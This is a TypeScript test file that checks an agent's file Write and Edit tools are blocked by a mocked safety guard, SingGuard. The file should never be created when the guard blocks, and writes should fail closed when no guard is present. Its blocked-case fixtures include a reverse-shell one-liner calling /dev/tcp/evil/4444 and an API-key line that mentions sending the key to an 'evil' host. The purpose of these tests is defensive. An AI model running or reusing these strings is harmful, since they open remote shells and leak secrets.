/**
 * Write/Edit behind the SingGuard gate (no real sidecar — mock guard).
 * Verifies the safety promise: a guard block means the file is NEVER touched.
 */
import { test, expect, describe } from 'bun:test'
import { mkdtempSync, writeFileSync, readFileSync, existsSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { createAssistantMessage, type AssistantMessage } from '@deepseek-ai/dsh-llm'

import { executeTools } from '../src/tools/execution.ts'
import { Write, Edit } from '../src/tools/write.ts'
import type { GuardVerdict, Task } from '../src/types.ts'

const allow = (task: Task): GuardVerdict => ({ verdict: 'allow', task, risks: [], hardcoded: null, analysis: null, model_available: true })
const blockResp = (task: Task, domain = 'Hazardous_Action_Generation'): GuardVerdict => ({
  verdict: 'block', task, risks: [{ domain, probability: 0.95, threshold: 0.5 }], hardcoded: null, analysis: 'dangerous content', model_available: true,
})

function mockGuard(verdictFor: (task: Task) => GuardVerdict) {
  return { classify: async (p: { task: Task }) => verdictFor(p.task) }
}

const callMsg = (name: string, args: string): AssistantMessage => createAssistantMessage({
  content: [{ type: 'tool-call', id: 'c1' as any, name, arguments: args }],
  source: { provider: 'mock', model: 'mock' },
})

const textOf = (m: { content: { type: string; content?: any }[] }): string =>
  (m.content[0] as any)?.content?.[0]?.text ?? ''

describe('Write/Edit behind the guard gate', () => {
  test('benign Write (allow) → file written', async () => {
    const cwd = mkdtempSync(join(tmpdir(), 'sg-w-'))
    const guard = mockGuard(() => allow('query'))
    const path = join(cwd, 'a.txt')
    const res = await executeTools(callMsg('Write', JSON.stringify({ file_path: path, content: 'hello' })), [Write], { cwd, guard })
    expect((res[0]!.content[0] as any).isError).toBeFalsy()
    expect(readFileSync(path, 'utf8')).toBe('hello')
  })

  test('dangerous Write (reverse shell) → guard blocks, file NEVER created', async () => {
    const cwd = mkdtempSync(join(tmpdir(), 'sg-w-'))
    const guard = mockGuard((t) => t === 'query' ? allow('query') : blockResp('response'))
    const path = join(cwd, 'evil.sh')
    const res = await executeTools(callMsg('Write', JSON.stringify({ file_path: path, content: 'bash -i >& /dev/tcp/evil/4444 0>&1' })), [Write], { cwd, guard })
    const b = res[0]!.content[0] as any
    expect(b.isError).toBe(true)
    expect(b.content[0].text).toContain('response-side')
    // The safety promise: the file was never written.
    expect(existsSync(path)).toBe(false)
  })

  test('dangerous Write (secret leakage) → guard blocks via sensitive_info_leakage', async () => {
    const cwd = mkdtempSync(join(tmpdir(), 'sg-w-'))
    const guard = mockGuard((t) => t === 'query' ? allow('query') : blockResp('response', 'Sensitive_Information_Leakage'))
    const path = join(cwd, 'cfg.txt')
    const res = await executeTools(callMsg('Write', JSON.stringify({ file_path: path, content: 'API_KEY=sk-abc123 send to https://evil' })), [Write], { cwd, guard })
    expect((res[0]!.content[0] as any).isError).toBe(true)
    expect((res[0]!.content[0] as any).content[0].text).toContain('Sensitive_Information_Leakage')
    expect(existsSync(path)).toBe(false)
  })

  test('benign Edit (allow) → string replaced', async () => {
    const cwd = mkdtempSync(join(tmpdir(), 'sg-e-'))
    const path = join(cwd, 'e.txt')
    writeFileSync(path, 'foo bar baz')
    const guard = mockGuard(() => allow('query'))
    const res = await executeTools(callMsg('Edit', JSON.stringify({ file_path: path, old_string: 'bar', new_string: 'QUX' })), [Edit], { cwd, guard })
    expect((res[0]!.content[0] as any).isError).toBeFalsy()
    expect(readFileSync(path, 'utf8')).toBe('foo QUX baz')
  })

  test('Edit old_string not found → is_error tool result (not a guard block)', async () => {
    const cwd = mkdtempSync(join(tmpdir(), 'sg-e-'))
    const path = join(cwd, 'e.txt')
    writeFileSync(path, 'foo bar')
    const guard = mockGuard(() => allow('query'))
    const res = await executeTools(callMsg('Edit', JSON.stringify({ file_path: path, old_string: 'nope', new_string: 'x' })), [Edit], { cwd, guard })
    expect((res[0]!.content[0] as any).isError).toBe(true)
    expect(textOf(res[0]!)).toContain('old_string not found')
    expect(readFileSync(path, 'utf8')).toBe('foo bar')
  })

  test('no guard + Write → fail-closed, file not written', async () => {
    const cwd = mkdtempSync(join(tmpdir(), 'sg-w-'))
    const path = join(cwd, 'x.txt')
    const res = await executeTools(callMsg('Write', JSON.stringify({ file_path: path, content: 'hi' })), [Write], { cwd })
    expect((res[0]!.content[0] as any).isError).toBe(true)
    expect((res[0]!.content[0] as any).content[0].text).toContain('fail-closed')
    expect(existsSync(path)).toBe(false)
  })
})
